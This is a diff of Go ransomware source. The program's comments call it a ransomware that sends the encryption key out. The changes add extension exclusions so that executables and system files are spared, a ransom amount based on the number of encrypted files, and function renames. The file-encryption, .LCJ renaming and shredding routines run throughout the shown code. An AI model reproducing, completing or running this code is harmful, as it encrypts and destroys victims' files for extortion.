@@ -11,6 +11,8 @@ package main
 // send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
 // and send with the message the encryption key
 
+
+
 import (
 	"crypto/aes"
 	"crypto/cipher"
@@ -30,6 +32,10 @@ import (
 	"strings"
 	"time"
 )
+
+var key []byte
+var file_count int
+var saved_ext = [...]string{"LCJ", "dll", "exe", "iso", "img", "msi", "deb", "ini",}
 
 func init() {
 	 //rand.Seed not working
@@ -150,8 +156,6 @@ func overwriteFile(path string, random bool) error {
 // ========= END SHRED =========
 
 // ========= ENCRYPT =========
-var key []byte
-/////////////////////
 
 func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
 	var public_key string =
@@ -234,9 +238,6 @@ func check_key() {
 	}
 }
 
-/////////////////////
-
-
 func encryptFile(inputfile string, outputfile string) {
 	b, err := ioutil.ReadFile(inputfile) //Read the target file
 	Error(err)
@@ -248,7 +249,6 @@ func encryptFile(inputfile string, outputfile string) {
 		os.Exit(0)
 	}
 }
-
 
 func encodeBase64(b []byte) []byte {
 	return []byte(base64.StdEncoding.EncodeToString(b))
@@ -272,7 +272,7 @@ func encrypt(key, text []byte) []byte {
 
 // ========= END ENCRYPT =========
 
-func listdir(path string)([]string){
+func list_dir(path string)([]string){
 	searchDir := path
 	fileList := make([]string, 0)
 	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
@@ -323,7 +323,7 @@ func byte_to_mega(file int64)(float64){
 func is_windows(file string)(){
 	s := strings.Split(file, "/")
 	if (s[len(s)-1] == "Windows"){
-		fileList := listdir(file)
+		fileList := list_dir(file)
 		for _, f := range fileList {
 			s1 := strings.Split(f, "/")
 			if (s1[len(s)-1] == "System32"){ // 19111999 :
@@ -336,33 +336,45 @@ func is_windows(file string)(){
 	//fmt.Println(s[len(s)-1])
 }
 
+func check_ext(file string) bool{
+	ext_split := strings.Split(file, ".")
+	file_ext  := ext_split[len(ext_split)-1:][0]
+	for _, ext := range saved_ext{
+		if file_ext == ext{
+			fmt.Println(file)
+			return true
+		}
+	}
+	return false
+}
+
+func ransom_amount(files_encrypted int) int{
+	return int(float32(files_encrypted) * 1.25)
+}
+
 func pass()(){
 	_ = ""
 }
 
-func tree(path string)(){
-	file_list := listdir(path)
+func file_list(path string)(){
+	file_tree := list_dir(path)
 
 	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
 	start := time.Now()
 	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
 		var max_size float64
-		for _, file := range file_list {
-			if file == "/root/y/PhpStorm-203.7717.64/plugins/yaml/lib/resources_en.jar"{
-				pass()
-			}
-			if file == "/root/y/PhpStorm-203.7717.64/plugins/yaml/lib/yaml.jar"{
-				pass()
-			}
+		for _, file := range file_tree {
+
 			var pa *[]string
-			pa = &file_list
+			pa = &file_tree
 			fmt.Println("In for : ", &pa)
 
 			if is_dir(file){
-				file_list = remove_to_index(file_list, 1)
+				file_tree = remove_to_index(file_tree, 1)
 				continue
 			}
-			if file[len(file)-4:] == ".LCJ"{
+			if check_ext(file){ // lisandro : exe ?
+				file_tree = remove_to_index(file_tree, 1)
 				continue
 			}
 
@@ -379,8 +391,12 @@ func tree(path string)(){
 			if size <= max_size {
 				encryptFile(file, file+".LCJ")
 				shredconf.Path(file)
-				file_list = remove_to_index(file_list, 1)
+				file_tree = remove_to_index(file_tree, 1)
+				file_count++
 			} else {
+				fmt.Println(file)
+				file_tree = remove_to_index(file_tree, 1)
+				file_tree = append(file_tree, file)
 				continue
 			}
 		}
@@ -392,8 +408,9 @@ func tree(path string)(){
 func main() {
 	check_key()
 	path := "/root/y"
-	tree(path)
-	//tree(path, false)
+	file_list(path)
+	fmt.Println(file_count, ransom_amount(file_count))
+	//file_list(path, false)
 }
 
 
